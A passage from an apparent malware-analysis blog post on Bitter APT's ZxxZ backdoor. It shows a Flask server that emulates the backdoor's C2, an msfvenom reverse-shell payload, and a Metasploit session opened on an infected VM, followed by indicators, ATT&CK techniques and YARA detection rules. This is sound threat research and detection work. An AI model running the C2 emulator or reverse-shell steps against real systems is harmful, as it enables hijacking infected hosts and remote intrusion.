+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/VcvNbtgRrPopqSD/SzWvcxuer/userlog.php&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>checkin</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>os</span>           <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;OsI&#39;</span><span class=p>)</span>  <span class=c1># Operating System</span>
+</span></span><span class=line><span class=cl>    <span class=n>username</span>     <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>)</span> <span class=c1># Username</span>
+</span></span><span class=line><span class=cl>    <span class=n>computername</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>)</span>   <span class=c1># ComputerName</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[checkin] </span><span class=si>{</span><span class=n>os</span><span class=si>}</span><span class=s1>/</span><span class=si>{</span><span class=n>computername</span><span class=si>}</span><span class=s1>/</span><span class=si>{</span><span class=n>username</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>computername</span><span class=si>}{</span><span class=n>username</span><span class=si>}</span><span class=s1>&#34;</span><span class=si>{</span><span class=n>payload_name</span><span class=si>}</span><span class=s1>&#34;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>status</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;txt&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>data</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>magic_0</span> <span class=o>+</span> <span class=n>delim</span><span class=p>):</span>        <span class=c1># Payload is already running</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>payload_is_already_running</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>data</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>magic_1</span> <span class=o>+</span> <span class=n>delim</span><span class=p>):</span>        <span class=c1># Payload is executing</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>payload_is_executing</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>data</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>magic_2</span> <span class=o>+</span> <span class=n>delim</span><span class=p>):</span>        <span class=c1># Executed payload is running</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>payload_is_running</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>data</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>magic_3</span> <span class=o>+</span> <span class=n>delim</span><span class=p>):</span>        <span class=c1># Executed payload is not running</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=n>payload_is_not_running</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;invalid&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/VcvNbtgRrPopqSD/WqeC812CCvU/&lt;payload&gt;&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_payload</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;sending payload&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0xf65</span> <span class=o>+</span> <span class=n>payload_data</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>80</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>When a C2 server is down, a great way to control the malware you are debugging is to run your own C2 server. This does come with its own challenges as we need to reverse engineer how the malware handles responses. But at least we are in control now! 🦾</p><p>To create our own payload we can do the following.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom --platform windows --arch x86 -p windows/meterpreter/reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>&lt;host&gt; <span class=nv>LPORT</span><span class=o>=</span>&lt;port&gt; -f exe -o payload.exe
+</span></span></code></pre></td></tr></table></div></div><p>We can now use this to execute our payload by performing the following.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./zxxz.py --host 0.0.0.0 --port <span class=m>80</span> --debug --input payload.exe
+</span></span></code></pre></td></tr></table></div></div><p>Then in metasploit we need to setup our listener. Once we have the C2 server <code>zxxz.py</code> running, our payload created and <code>metasploit</code> listening for the <code>meterpreter</code> <code>reverse_tcp</code> callback. We can run the malware on the infected VM. This will yield us a successful execution of our own payload resulting in a <em><a href=https://www.metasploit.com/ target=_blank rel="noopener noreffer">meterpreter</a></em> session.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfconsole
+</span></span><span class=line><span class=cl>&gt; use exploit/multi/handler
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> payload windows/meterpreter/reverse_tcp
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> LHOST 0.0.0.0
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> LPORT &lt;port&gt;
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; exploit
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 0.0.0.0:4444
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>175174</span> bytes<span class=o>)</span> to &lt;redacted&gt;
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>3</span> opened <span class=o>(</span>&lt;host&gt;:&lt;port&gt; -&gt; &lt;redacted&gt;:50218 <span class=o>)</span> at 2022-07-02 17:17:52 -0400
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>meterpreter &gt; shell
+</span></span><span class=line><span class=cl>Process <span class=m>772</span> created.
+</span></span><span class=line><span class=cl>Channel <span class=m>1</span> created.
+</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.1.7601<span class=o>]</span>
+</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> <span class=m>2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\m</span>alware<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\U</span>pdates&gt;whoami
+</span></span><span class=line><span class=cl>malware-pc<span class=se>\m</span>alware
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\m</span>alware<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\U</span>pdates&gt; C:<span class=se>\U</span>sers<span class=se>\m</span>alware&gt;start <span class=s2>&#34;C:\Program Files\Mozilla Firefox\firefox.exe&#34;</span> <span class=s2>&#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\m</span>alware<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\U</span>pdates&gt;exit
+</span></span><span class=line><span class=cl>meterpreter &gt;
+</span></span></code></pre></td></tr></table></div></div><h5 id=proof-of-concept-poc>Proof of Concept (PoC)</h5><p>In this Proof of Concept (PoC) video I use my own C2 server for Bitter APT&rsquo;s ZxxZ backdoor and send my own <code>meterpreter</code> payload to the infected machine.</p><iframe width=560 height=315 src=https://www.youtube.com/embed/m3jrWoQK6sI title="YouTube video player" frameborder=0 allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h5 id=summary>Summary</h5><p>This kind of C2 analysis is a lot of work. 👷‍♀</p><p>However, please consider the following benifits.</p><ul><li>Reliable detection signatures</li><li>Scanning the internet for other potential C2 servers</li><li>Debug future samples easier when the C2 server is down</li></ul><h2 id=configuration-extraction>Configuration Extraction</h2><p>Since we now understand how the malware decrypts its strings, I created an automated configuration extractor for <a href=https://github.com/c3rb3ru5d3d53c/mwcfg target=_blank rel="noopener noreffer">mwcfg</a>. The following is an example of how to perform extraction on Bitter APT ZxxZ samples you might have.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mwcfg --modules modules/ --input tests/bitter/cc7ddf9ed230ad4e060dfd0f32389efb --pretty
+</span></span><span class=line><span class=cl><span class=o>[</span>
+</span></span><span class=line><span class=cl>    <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;tests/bitter/cc7ddf9ed230ad4e060dfd0f32389efb&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;type&#34;</span>: <span class=s2>&#34;PE32 executable (GUI) Intel 80386, for MS Windows&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;mime&#34;</span>: <span class=s2>&#34;application/x-dosexec&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;md5&#34;</span>: <span class=s2>&#34;cc7ddf9ed230ad4e060dfd0f32389efb&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;sha1&#34;</span>: <span class=s2>&#34;05af416c3173cdb0b49d51db1db7b8f90639e3b8&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;sha256&#34;</span>: <span class=s2>&#34;09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;configs&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>            <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;domain&#34;</span>: <span class=s2>&#34;subscribe.tomcruefrshsvc.com&#34;</span>,
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;family&#34;</span>: <span class=s2>&#34;bitter_zxxz&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=o>]</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=classification>Classification</h2><p>I wouldn&rsquo;t call this malware a Remote Administration Tool (RAT) or a botnet for that matter. The functionality is quite simple. Accept a single command, which is the payload you wish to execute from the C2 server. With this in mind, I classify this malware as a backdoor.</p><h2 id=conclusion>Conclusion</h2><p>We reverse engineered Bitter APT&rsquo;s ZxxZ backdoor to the point we can repurpose it for our own red team operations. What I really wanted to show with this analysis and Proof of Concept (PoC), is that we need to be very careful with our attribution of threat actors. It is undeniably possible for one nation-state threat actor to frame another using similar methods. Based on this analysis, it would also not suprise me if this behavior is already happening in the wild.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/e56a38ebc06a27055301baa0eee603fc8804216d3544a2a74876e08f664db388.png data-srcset="/images/e56a38ebc06a27055301baa0eee603fc8804216d3544a2a74876e08f664db388.png, /images/e56a38ebc06a27055301baa0eee603fc8804216d3544a2a74876e08f664db388.png 1.5x, /images/e56a38ebc06a27055301baa0eee603fc8804216d3544a2a74876e08f664db388.png 2x" data-sizes=auto alt=/images/e56a38ebc06a27055301baa0eee603fc8804216d3544a2a74876e08f664db388.png title=attribution width=999 height=552></p><p>Cisco Talos also did an analysis on ZxxZ backdoor entitled <a href=https://blog.talosintelligence.com/2022/05/bitter-apt-adds-bangladesh-to-their.html target=_blank rel="noopener noreffer">Bitter APT adds Bangladesh to their Targets</a>. Although this is a great report, I wanted to do more with this malware to showcase what is possible.</p><p>I could certainly weaponize their code by writing a utility to patch the maldoc exploit and backdoor. However, I have decided against doing this as it would make it too easy for skiddies to parade around as Bitter APT and cause more mayhem for our industry.</p><p>Although I do poke fun at Bitter APT&rsquo;s mistakes, this attack chain from them shows that they are capable of being a notable threat to Pakistan 🇵‍🇰. While they are not delivering the most advanced attack in this example, these APT groups usually are large orgainzations of people with a large variety of skill levels. This malware would appear to be created by someone who is likely new to developing nation state quality malware. I wonder if they have quality control as part of their standard processes and procedures, perhaps we will never know. 😅</p><p>I think we successfully destroyed Bitter APT&rsquo;s ZxxZ backdoor now. 😜</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/bfd5ecd13a88b7efb2e4fc13146a10e188fffe147fe260c6a6ea34e1e5ce68fc.jpg data-srcset="/images/bfd5ecd13a88b7efb2e4fc13146a10e188fffe147fe260c6a6ea34e1e5ce68fc.jpg, /images/bfd5ecd13a88b7efb2e4fc13146a10e188fffe147fe260c6a6ea34e1e5ce68fc.jpg 1.5x, /images/bfd5ecd13a88b7efb2e4fc13146a10e188fffe147fe260c6a6ea34e1e5ce68fc.jpg 2x" data-sizes=auto alt=/images/bfd5ecd13a88b7efb2e4fc13146a10e188fffe147fe260c6a6ea34e1e5ce68fc.jpg title=destroyed width=709 height=401></p><h2 id=downloads>Downloads</h2><ul><li><a href=/samples/2022-07-04-zxxz.zip rel>Samples and Ghidra Project</a></li></ul><h2 id=indicators>Indicators</h2><p>This section covers all the indicators covered in the report.</p><h3 id=static>Static</h3><table><thead><tr><th>Type</th><th>Filename</th><th>Description</th><th>SHA256</th></tr></thead><tbody><tr><td>hash</td><td>sample_0.bin</td><td>Maldoc</td><td><font style=color:red>9a8b201eb2bebe309d15c7b0ab5a6dcde460b84b035bb3575d4a0ec6af51a37e</font></td></tr><tr><td>hash</td><td>sample_1.bin</td><td>OLE Object</td><td><font style=color:red>96e61b3f2c3c4ffe065c0aa492145b90956b45660bd614e5924ef9b6dade3c57</font></td></tr><tr><td>hash</td><td>sample_2.bin</td><td>OLE Stream</td><td><font style=color:red>f0d4d43cd6f3c33ed78d13722e81d03f21101edbc15cb0782448d0843fb2bf7f</font></td></tr><tr><td>hash</td><td>sample_3.bin</td><td>Decrypted Shellcode</td><td><font style=color:red>d6fdc95e74aea3f7072ca713213ff157c0999f53b3b130f8217ea63231b109ad</font></td></tr><tr><td>url</td><td></td><td>MSI Payload</td><td><font style=color:red>hxxp://sbss[.]com[.]pk/gts/bd[.]msi</font></td></tr><tr><td>domain</td><td></td><td>MSI Payload</td><td><font style=color:red>sbss[.]com[.]pk</font></td></tr><tr><td>ip</td><td></td><td>MSI Payload</td><td><font style=color:red>203[.]124[.]44[.]180</font></td></tr><tr><td>hash</td><td>sample_4.bin</td><td>MSI Installer</td><td><font style=color:red>b026a255b2e17fb0c608f1265837e425ea89cc7f661975c6a0d9051e917f4611</font></td></tr><tr><td>hash</td><td>sample_5.bin</td><td>CAB Archive</td><td><font style=color:red>42745ddb257a25671f18ff6c2ad38e9c89b64f4d13f4412097691384e626672f</font></td></tr><tr><td>hash</td><td>sample_6.bin</td><td>PE Payload</td><td><font style=color:red>09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe</font></td></tr><tr><td>domain</td><td></td><td>C2 Domain</td><td><font style=color:red>subscribe[.]tomcruefrshsv[.]com</font></td></tr><tr><td>ip</td><td></td><td>C2 IP</td><td><font style=color:red>185[.]7[.]33[.]56</font></td></tr></tbody></table><h3 id=ttps>TTPs</h3><table><thead><tr><th>ID</th><th>Tactic</th><th>Technique</th></tr></thead><tbody><tr><td><a href=https://attack.mitre.org/techniques/T1203/ target=_blank rel="noopener noreffer">T1203</a></td><td>Execution</td><td>Exploitation for Client Execution</td></tr><tr><td><a href=https://attack.mitre.org/techniques/T1547/ target=_blank rel="noopener noreffer">T1547</a></td><td>Persistence</td><td>Boot or Logon Autostart Execution</td></tr><tr><td><a href=https://attack.mitre.org/techniques/T1095/ target=_blank rel="noopener noreffer">T1095</a></td><td>Command and Control</td><td>Non-Application Layer Protocol</td></tr><tr><td><a href=https://attack.mitre.org/techniques/T1592/ target=_blank rel="noopener noreffer">T1592</a></td><td>Reconnaissance</td><td>Gather Victim Host Information</td></tr><tr><td><a href=https://attack.mitre.org/techniques/T1001/ target=_blank rel="noopener noreffer">T1001</a></td><td>Command and Control</td><td>Data Obfuscation</td></tr></tbody></table><h3 id=graph>Graph</h3><iframe src=https://www.virustotal.com/graph/embed/gca09a155495b4964a06b646bd6f44968497a6599a6a44c239db66e0410c5a9bd width=700 height=400></iframe><h2 id=detection>Detection</h2><p>I&rsquo;m providing the following signatures to help the community detect this threat.</p><h3 id=yara>YARA</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>rule</span> <span class=n>malware_bitter_zxxz_0</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>meta</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>		<span class=n>author</span>      <span class=o>=</span> <span class=s2>&#34;c3rb3ru5d3d53c&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>description</span> <span class=o>=</span> <span class=s2>&#34;MALWARE Bitter APT ZxxZ Backdoor&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=nb>hash</span>        <span class=o>=</span> <span class=s2>&#34;09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>reference</span>   <span class=o>=</span> <span class=s2>&#34;https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>created</span>     <span class=o>=</span> <span class=s2>&#34;2022-07-01&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>os</span>          <span class=o>=</span> <span class=s2>&#34;windows&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>tlp</span>         <span class=o>=</span> <span class=s2>&#34;white&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>rev</span>         <span class=o>=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>	<span class=n>strings</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>		<span class=err>$</span><span class=n>delimiter</span>        <span class=o>=</span> <span class=s2>&#34;ZxxZ&#34;</span> <span class=n>ascii</span> <span class=n>wide</span>
+</span></span><span class=line><span class=cl>		<span class=err>$</span><span class=n>rng</span>              <span class=o>=</span> <span class=p>{</span><span class=n>c7</span> <span class=mi>05</span> <span class=err>??</span> <span class=err>??</span> <span class=err>??</span> <span class=err>??</span> <span class=mi>52</span> <span class=mi>4</span><span class=n>e</span> <span class=mi>47</span> <span class=mi>00</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=err>$</span><span class=n>string_decryptor</span> <span class=o>=</span> <span class=p>{</span><span class=mi>53</span> <span class=mi>3</span><span class=n>b</span> <span class=n>ca</span> <span class=mi>75</span> <span class=err>??</span> <span class=mi>33</span> <span class=n>c9</span> <span class=mi>8</span><span class=n>a</span> <span class=mi>1</span><span class=n>c</span> <span class=err>??</span> <span class=mi>30</span> <span class=mi>1</span><span class=n>c</span> <span class=err>??</span> <span class=mi>40</span> <span class=mi>41</span> <span class=mi>3</span><span class=n>b</span> <span class=n>c6</span> <span class=mi>7</span><span class=n>c</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>condition</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>		<span class=n>uint16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0x5a4d</span> <span class=ow>and</span>
+</span></span><span class=line><span class=cl>        <span class=n>uint32</span><span class=p>(</span><span class=n>uint32</span><span class=p>(</span><span class=mh>0x3c</span><span class=p>))</span> <span class=o>==</span> <span class=mh>0x00004550</span> <span class=ow>and</span>
+</span></span><span class=line><span class=cl>		<span class=n>filesize</span> <span class=o>&lt;</span> <span class=mi>4128028</span> <span class=ow>and</span>
+</span></span><span class=line><span class=cl>        <span class=mi>2</span> <span class=n>of</span> <span class=n>them</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rule</span> <span class=n>heuristic_xor_strings_0</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>meta</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>author</span>      <span class=o>=</span> <span class=s2>&#34;c3rb3ru5d3d53c&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>description</span> <span class=o>=</span> <span class=s2>&#34;HEURISTIC Suspicious XOR Strings&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>reference</span>   <span class=o>=</span> <span class=s2>&#34;https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=nb>hash</span>        <span class=o>=</span> <span class=s2>&#34;f0d4d43cd6f3c33ed78d13722e81d03f21101edbc15cb0782448d0843fb2bf7f&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>created</span>     <span class=o>=</span> <span class=s2>&#34;2022-06-27&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=nb>type</span>        <span class=o>=</span> <span class=s2>&#34;heuristic&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>os</span>          <span class=o>=</span> <span class=s2>&#34;windows&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>tlp</span>         <span class=o>=</span> <span class=s2>&#34;white&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>rev</span>         <span class=o>=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>strings</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=err>$</span><span class=n>str_0</span> <span class=o>=</span> <span class=s2>&#34;://&#34;</span>            <span class=n>xor</span>
+</span></span><span class=line><span class=cl>        <span class=err>$</span><span class=n>str_1</span> <span class=o>=</span> <span class=s2>&#34;LoadLibrary&#34;</span>    <span class=n>xor</span>
+</span></span><span class=line><span class=cl>        <span class=err>$</span><span class=n>str_2</span> <span class=o>=</span> <span class=s2>&#34;GetProcAddress&#34;</span> <span class=n>xor</span>
+</span></span><span class=line><span class=cl>        <span class=err>$</span><span class=n>str_3</span> <span class=o>=</span> <span class=s2>&#34;ShellExecute&#34;</span>   <span class=n>xor</span>
+</span></span><span class=line><span class=cl>        <span class=err>$</span><span class=n>str_4</span> <span class=o>=</span> <span class=s2>&#34;kernel32&#34;</span>       <span class=n>xor</span>
+</span></span><span class=line><span class=cl>    <span class=n>condition</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>any</span> <span class=n>of</span> <span class=p>(</span><span class=err>$</span><span class=n>str_</span><span class=o>*</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rule</span> <span class=n>heuristic_pe_default_project_name_0</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>meta</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>		<span class=n>author</span>      <span class=o>=</span> <span class=s2>&#34;c3rb3ru5d3d53c&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>description</span> <span class=o>=</span> <span class=s2>&#34;HEURISTIC Binary Default Project Name&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>reference</span>   <span class=o>=</span> <span class=s2>&#34;https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=nb>hash</span>        <span class=o>=</span> <span class=s2>&#34;09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>created</span>     <span class=o>=</span> <span class=s2>&#34;2022-06-29&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>os</span>          <span class=o>=</span> <span class=s2>&#34;windows&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>tlp</span>         <span class=o>=</span> <span class=s2>&#34;white&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>rev</span>         <span class=o>=</span> <span class=mi>1</span>
